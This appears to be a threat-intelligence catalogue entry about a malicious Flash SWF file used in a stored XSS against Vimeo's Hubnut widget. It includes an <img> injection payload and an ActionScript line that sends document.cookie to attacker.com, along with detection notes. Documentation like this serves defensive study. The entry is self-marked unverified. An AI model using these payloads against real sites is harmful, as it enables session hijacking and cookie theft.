---
url: //u00f1.xyz/xss.swf
tags:
  - xss
  - flash
  - malicious-swf
type: tool
verified: false
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:47.419Z'
id: 80d42bed-c257-4e01-be2e-b26cf2986ff3
validated: true
submitted: true
---
# xss-swf-Malicious-Flash-File

**Status**: Unverified

## Overview

A custom malicious SWF (Flash) file designed to execute arbitrary JavaScript when loaded via an injected <img> tag in Vimeo's Hubnut widget, primarily used in stored XSS demonstrations to pop alerts or perform client-side actions like cookie theft.

## Description

This tool is an external SWF file hosted on a third-party domain (e.g., u00f1.xyz) that, when fetched by the unescaped <img src> in the Flash-rendered user name, executes JavaScript in the browser context of vimeo.com or player.vimeo.com. It serves as the payload delivery mechanism for the XSS, enabling actions such as alert(document.domain) for proof-of-concept or more advanced exploits like keylogging.

## Features

- Feature 1: Executes JavaScript directly in the victim browser upon loading.
- Feature 2: Compatible with legacy Flash environments like Vimeo's hubnut.swf.
- Feature 3: Minimal footprint, designed for stealthy client-side execution.

## Installation

### Requirements

- Flash development environment (e.g., Adobe Flash Professional) or ActionScript compiler.
- Hosting service for SWF files (e.g., custom domain like u00f1.xyz).

### Install Commands

No traditional installation; compile ActionScript code into SWF:

```bash
# Example using a Flash compiler (if available)
asc2swf script.as -o xss.swf
```

## Basic Usage

Host the SWF file externally and reference it in the XSS payload: '<img src="//yourhost.com/xss.swf">'.

### Common Options

| Option | Description |
|--------|-------------|
| N/A | SWF files do not have CLI options; behavior is hardcoded in ActionScript. |

## Examples

### Example 1: Basic Usage

Inject into Vimeo profile: '<img src="//u00f1.xyz/xss.swf">'. When triggered, it runs alert(document.domain).

### Example 2: Advanced Usage

Modify the SWF's ActionScript to exfiltrate cookies: ExternalInterface.call("eval", "fetch('https://attacker.com?cookie=' + document.cookie)");

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[JavaScript]]
- [[Drive-by Compromise]]

### Tactics

- [[Execution]]

## Detection

Indicators and methods for detecting this tool's usage:

- Detection method 1: Monitor for unexpected SWF fetches from Flash files to external domains.
- Detection method 2: Browser dev tools showing cross-origin SWF loads with JS execution.

## Related Procedures


## Related Tools

- [[Related Flash Exploit Tools]]

## References

- Adobe ActionScript documentation
- HackerOne Report #87577
